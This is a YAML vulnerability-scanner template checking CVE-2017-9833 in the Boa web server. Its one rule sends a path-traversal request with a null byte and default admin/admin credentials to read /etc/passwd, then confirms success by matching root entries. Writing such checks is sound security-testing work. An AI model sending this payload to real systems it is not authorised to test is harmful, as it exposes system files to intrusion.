name: poc-yaml-boa-cve-2017-9833-fileread
binding: b0e43d3a-9acb-4557-9120-01fff9137ffc
manual: true
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://www.tenable.com/cve/CVE-2017-9833
    vulnerability:
        id: CT-31858
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /cgi-bin/wapopen?B1=OK&NO=CAM_16&REFRESH_TIME=Auto_00&FILECAMERA=../../etc/passwd%00&REFRESH_HTML=auto.htm&ONLOAD_HTML=onload.htm&STREAMING_HTML=streaming.htm&NAME=admin&PWD=admin&PIC_SIZE=0
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
